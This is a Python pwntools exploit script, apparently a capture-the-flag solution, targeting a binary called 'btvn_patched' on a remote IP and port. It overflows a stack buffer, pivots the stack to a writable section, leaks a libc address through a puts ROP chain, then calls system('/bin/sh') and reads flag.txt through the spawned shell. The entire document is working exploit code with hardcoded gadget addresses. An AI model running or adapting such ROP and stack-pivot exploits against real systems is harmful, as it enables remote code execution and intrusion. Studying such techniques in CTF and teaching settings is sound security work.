#!/usr/bin/env python3

from pwn import *

PORT =  13331
HOST = "14.225.198.235"
exe = context.binary = ELF('./btvn_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x00000000040122C
            b*0x40124A
            c
            set follow-fork-mode parent
            ''')
        input()

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()
offset = 0x68
vuln_addr = 0x401201      
leave_ret = 0x00000000004011a3
pop_rdi = 0x000000000040119a
ret = 0x000000000040101a
rw_section = 0x404060
main_addr = 0x40124A 

fake_stack = rw_section + 0x900

# STAGE 1: Pivot

pl = flat(
    b'A'*0x60,
    fake_stack + 0x60,
    vuln_addr
    )
p.sendafter(b"Input: ", pl[:111])

# STAGE 2: Leak libc base

pl = flat(
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    main_addr
    )

pl = pl.ljust(0x60, b'A')
pl += p64(fake_stack - 8)
pl += p64(leave_ret)

p.sendafter(b"Input: ", pl.ljust(111)[:111])
p.recvuntil(b"Output: \n")
p.recvline()

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym.puts
log.info("libc_base: " + hex(libc.address))

# STAGE 3: Pivot

pl = flat(
    b'A'*0x60,
    fake_stack + 0x60,
    vuln_addr
    )
p.sendafter(b"Input: ", pl[:111])

# STAGE 4: Get shell

pl = flat(
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.sym.system
    )

pl = pl.ljust(0x60, b'A')
pl += p64(fake_stack - 8)
pl += p64(leave_ret)

p.sendafter(b"Input: ", pl.ljust(111)[:111])
p.sendline(b"cat flag.txt")

p.interactive()